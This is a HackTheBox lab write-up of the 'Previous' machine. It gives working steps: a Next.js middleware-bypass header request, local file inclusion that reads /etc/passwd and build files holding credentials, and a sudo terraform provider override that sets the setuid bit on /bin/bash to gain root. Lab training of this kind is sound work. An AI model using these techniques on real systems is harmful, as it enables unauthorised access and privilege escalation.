# Previous-HTB Writeup

In this writeup I will explain in detail how I solved Previous machine on [Previous - HackTheBox](https://app.hackthebox.com/machines/Previous)

## User Flag

First off we're provided by the IP ```10.10.11.83``` so we run our nmap scan

```bash
~HTB/Previous:$ nmap -sS -sU 10.10.11.83
Nmap scan report for 10.10.11.83
Host is up (0.063s latency).
Not shown: 1000 closed udp ports (port-unreach), 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Lets add to our DNS and go to the http website
```bash
~HTB/Previous:$ sudo echo "10.10.11.83 previous.htb ftp.previous.htb" >> /etc/hosts
```

![index Page](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/Previous/images/main_page.png)

Whenever we click on docs or getting started we get redirected into sign-in screen

![Signin](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/Previous/images/login.png)

After doing a bit of research I came across this exploit [(CVE-2025-29927) Middleware bypass](https://github.com/kOaDT/poc-cve-2025-29927/blob/main/middleware.ts)

So we make our new header request for **http://previous.htb/docs** as follows
### Regular Request
```
GET /docs HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### Middleware bypass request
Adding middleware header with 5 middleware values
```
GET /docs HTTP/1.1
Host: previous.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

We now get this in our Burp Suite and we open it in browser
![BurpDocs](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/Previous/images/burp_docs.png)

![Browser Docs](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/Previous/images/docs.png)

Lets go to /docs/examples

![examples](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/Previous/images/examples_download.png)

Here we can see that we get redirected to /api/download?example=<example name>, this could be our way in using LFI (Local file Inclusion)

![download](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/Previous/images/download.png)

![/etc/passwd](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/Previous/images/etcpasswd.png)

Okay this is where the fun starts.
After reading the docs for [Next.JS](https://nextjs.org/docs) specifically file structure, I discovered that we need to search in the /.next directory, most interestingly -> ```/.next``` ```/build-manifest.json``` and ```/server/pages-manifest.json```

![page manifest](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/Previous/images/page_manifest.png)

I didn't find anything interesting in ```_app```, ```docs```, ```signin```, however in ```api``` we see ```api/auth/[...nextauth].js```, lets see what's written inside

![api_auth](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/Previous/images/api_auth.png)

Lets make this more readable

![user&pass](https://github.com/AmnesiacDev/HackTheBox-Writeups/blob/main/Previous/images/user%26pass.png)

Just like that we have a username and password to use

```bash
~HTB/Previous$ ssh jeremy@previous.htb
Enter jeremys password:

jeremy@previous.htb$ ls
user.txt
```

We got our first flag!

## Root flag
Lets enumerate and try to find something we can exploit for privilage escalation
```bash
jeremy@previous.htb$ sudo -l

Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```
That was quick, one simple google search led me to this [Terraform PoC](https://github.com/dollarboysushil/Privilege-Escalation-PoC-Terraform-sudo-Exploit), lets follow instructions and get our root

```bash
jeremy@previous.htb$ cat /opt/examples/*.tf

terraform { 
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples" # <- this here is what we need
    }
  }
}
variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}
provider "examples" {}
resource "examples_example" "example" {
  source_path = var.source_path
}
output "destination_path" {
  value = examples_example.example.destination_path
}
```

```bash
jeremy@previous.htb$ cat > /tmp/terraform-provider-examples << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF

jeremy@previous.htb$ chmod +x /tmp/terraform-provider-examples

jeremy@previous.htb$ cat > /tmp/previous.rc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp"
  }
  direct {}
}
EOF

jeremy@previous.htb$ export TF_CLI_CONFIG_FILE=/tmp/previous.rc
jeremy@previous.htb$ sudo /usr/bin/terraform -chdir=/opt/examples apply
# You will get an error message here but that's fine 
# --error --
jeremy@previous.htb$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cd /root; ls
clean  examples  go  root.txt
```
Just like that we got our root flag which was significantly easier than getting the user flag
